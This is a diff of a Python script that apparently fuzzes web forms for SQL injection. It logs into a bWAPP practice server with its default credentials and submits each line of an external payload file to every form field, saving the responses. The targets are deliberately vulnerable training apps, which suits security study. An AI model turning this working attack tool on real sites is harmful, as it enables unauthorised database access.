@@ -3,65 +3,77 @@ import requests
 from parser import HTMLForm
 from parser import HTMLTargetParser
 
+#Method for logging into the application and creating a Session for accessing the 
+#different vulnerable pages in the bWAPP server for demonstration and testing
+def LOGIN(loginUrl):
+    session = requests.Session()
+    loginPayload = {'login':'bee','password':'bug','security_level':'0','form':'submit'}
+    login = session.post(loginUrl, data=loginPayload)
+    return session
+    
+#Method for parsing the web page and finding all HTML forms 
+def parseHtmlPage(url,session):
+    r = session.get(url)
+    targetParser = HTMLTargetParser()
+    targetParser.feed(r.text)
+    if not targetParser.formList:
+        print ("[-] The given URL had no forms for targetting")
+        exit()
+    return targetParser
+
+#Method for creating the dictionary data structure according to the referred HTML Form
+#The dictonary structure will be used in the POST/GET requests
+def createDictionary(form,value):
+    dataValues={}
+    for dataField in form.elementList:
+        #The action field of a button will not be processed by SQL
+        if dataField[1] == 'action':
+            dataValues.update({dataField[1]:dataField[3]})
+        else:
+            dataValues.update({dataField[1]:value})
+    print ("[+] Dictionary structure for sending the " + form.formType + " request")
+    print (dataValues)
+    return dataValues
+
+def sendRequestAndSaveResponse(url,session,dataValues,requestType,fileName):
+    if (requestType == 'POST'):
+        dataValues.update({'action':'search'})
+        s = session.post(url, data = dataValues)  
+    if (requestType == 'GET'):
+        s = session.get(url, params = dataValues)
+    f = open(fileName,'w')
+    f.write(s.text)
+    f.close()
+            
 def BEGIN():
 	res = ["URL"]
 	return res
 
 def RUN(file_name):
-    url = 'https://google-gruyere.appspot.com/471777688316025202488489537424605038600/login'
-    try:
-        r = requests.get(url)
-        targetParser = HTMLTargetParser()
-        targetParser.feed(r.text)
-    except Exception:
-        print("[-] The URL did not respond to the request")
-        exit()
-
-    if not targetParser.formList:
-        print ("[-] The given URL had no forms for targetting")
-        exit()
-
-    defaultValue='cebola'
+    loginUrl ='http://169.254.5.156/bWAPP/login.php'
+    url = 'http://169.254.5.156/bWAPP/sqli_6.php'
+    nonMaliciousValue='cebola'
+    attemptsFolder='attempts/'
+    filePrefix = 'form-'
+    nonMaliciousResponseFileName = '-nonMaliciousAttempt'
+    maliciousResponseFileName = '-attempt-'
     payloadFileName='sql_inj_payload'
-    payloadFile = open(payloadFileName,'r')
 
-    for form in targetParser.formList:
-        print (targetParser.formList[0].formType)
-        #for payload in open(payloadFileName):
-        dataValues={}
-        for dataField in form.elementList:
-            dataValues.update({dataField[1]:defaultValue})
-            print (dataValues)
-        try:
-            if (form.formType == 'POST'):
-                s = requests.post(url,data = dataValues,verify = True)  
-                print (s.text)
-            if (form.formType == 'GET'):
-                s = requests.get(url, params=dataValues, verify = True)
-            f = open('attempts/nonMaliciousAttempt','w')
-            f.write(s.text)
-            f.close()
-        except Exception:
-            print ("[-] An error occured while trying to send data")
+    session = LOGIN(loginUrl)
+    targetParser = parseHtmlPage(url,session) 
 
-    attempt=1
-    for form in targetParser.formList:
-        for payload in payloadFile: 
-            dataValues={}
-            for dataField in form.elementList:
-                dataValues.update({dataField[1]:payload})
-                print (dataValues)
-            try:
-                if (form.formType == 'POST'):
-                    s = requests.post(url,data = dataValues,verify = True)  
-                    print (s.text)
-                if (form.formType == 'GET'):
-                    s = requests.get(url, params=dataValues, verify = True)
-                f = open('attempts/'+str(attempt),'w')
-                f.write(s.text)
-                f.close()
-                attempt+=1
-            except Exception:
-                print ("[-] An error occured while trying to send data")
+    for index,form in enumerate(targetParser.formList):
+        dataValues = createDictionary(form,nonMaliciousValue)
+        filePath = attemptsFolder + filePrefix + str(index) + nonMaliciousResponseFileName
+        requestType = form.formType
+        sendRequestAndSaveResponse(url,session,dataValues,requestType,filePath)
 
-RUN("mope")
+    for index,form in enumerate(targetParser.formList):
+        payloadFile = open(payloadFileName,'r')
+        for attempt,payload in enumerate(payloadFile): 
+            dataValues = createDictionary(form,payload)
+            filePath = attemptsFolder + filePrefix+ str(index) + maliciousResponseFileName + str(attempt)
+            requestType=form.formType
+            sendRequestAndSaveResponse(url,session,dataValues,requestType,filePath)
+        payloadFile.close()
+RUN("")
